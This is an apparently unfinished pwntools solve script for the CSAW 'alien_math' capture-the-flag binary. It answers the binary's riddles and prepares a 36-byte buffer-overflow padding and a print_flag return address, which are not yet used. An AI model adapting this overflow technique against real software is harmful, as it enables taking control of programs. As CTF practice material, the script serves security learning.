#!/usr/bin/env python3

import random
from socket import recv_fds
from pwn import *

context.binary = binary = '/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math'
math_elf = ELF(binary)
#context.log_level = 'debug' ### Turn me back on for very verbose debugging info
print_flag = p64(0x4014fb)
OFFSET = 36
junk = b"A" * OFFSET

while True: #makes it convenient to keep looping feel free to remove while loop
    #p = remote('pwn.chal.csaw.io', 5004, ssl=False)
    p = process('/home/mckenziepepper/Documents/b0f-chals/CSAW/alien_math')
        
    guess1 = b"1804289383" #magic number to generate the required hex value
    p.sendlineafter("What is the square root of zopnol?", guess1)
    leak = p.recvuntil("!\n")
    log.info(f"{leak = }")
    if b"Correct!\n" in leak:
        False
        guess2 = b"7759406485255323229225"
        p.sendlineafter("How many tewgrunbs are in a qorbnorbf?", guess2)
        leak = p.recvuntil("You get a C. No flag this time.\n")
        #leak = p.recvuntil("Genius! One question left...\n") For when we know we can do the second question
        log.info(f"{leak = }")
        p.interactive()
    else:
        p.kill()
